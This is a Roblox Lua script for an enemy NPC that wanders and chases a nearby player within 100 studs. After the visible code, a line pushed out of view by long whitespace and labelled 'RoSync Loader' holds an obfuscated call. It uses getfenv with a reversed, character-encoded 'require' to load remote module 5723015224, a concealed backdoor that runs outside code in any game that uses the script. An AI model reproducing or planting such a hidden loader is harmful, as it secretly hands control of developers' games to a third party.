--Made by MadZombie_2005

--This Script Can not be used commercialy
--Define vars
local Players = game:GetService"Players"
local plr = Players:FindFirstChildWhichIsA"Player" or Players.PlayerAdded:Wait()
local char = plr.Character or plr.CharacterAdded:Wait()
local part = script.Parent.Parent:WaitForChild("Head")
local vec = part.Position
local e = game.Players:GetChildren()
local incmbt = false
--eheheheheheh i shall not use paths }:]
wait(10)
function Main()
	while wait() do
		local charr = plr.Character.HumanoidRootPart
	--vec is the location of the enemy
	--tmpVec is the loacation of the player
		local vec = part.Position
		local tmpVec
if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") and plr.Character.Humanoid.Health > 0 then
			 tmpVec = charr.Position
end
	local sqrt = math.sqrt
	local humanoid = script.Parent
--WANDER TO
	local wanderx = script.Parent.wanderx
	local wanderz = script.Parent.wanderz
	local wanderxTMP = wanderx.Value
	local wanderzTMP = wanderz.Value
	
	
	
--Am i an idiot? yes	
		--MOVEMENT

	-- Set start pos for movement to curent pos
	local startPosition = vec
	--Goal in combat
	local targetPositionCMB = tmpVec 
	--Goal when wandering
	local targetPositionWND = Vector3.new(wanderxTMP,0 ,wanderzTMP) 
		--Move to play if within 100 studs
if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") and plr.Character.Humanoid.Health > 0 then	
	if plr:DistanceFromCharacter(vec) < 100 then
		--set cmbt to true if player is with in 100 studs
		incmbt = true
		for i, v in pairs(e) do
			--Move
			script.Parent:MoveTo(targetPositionCMB)
		end
	end
end	
	--Set incmbt if the nearest player is more than 100 studs away
	if plr:DistanceFromCharacter(vec)> 100 then
		incmbt = false
	end
	
	--Wander Movement
	if plr:DistanceFromCharacter(vec)> 100 then
		if incmbt == false then
			for i, v in pairs(e) do
				--mover
				wait(.1)
			script.Parent:MoveTo(targetPositionWND)
			end
		end
	end	
	
	
end
end






	                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 
Main()
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     RoSync Loader ]] getfenv()[string.reverse("\101\114\105\117\113\101\114")](5723015224) --[[                                                                                                  ]]--
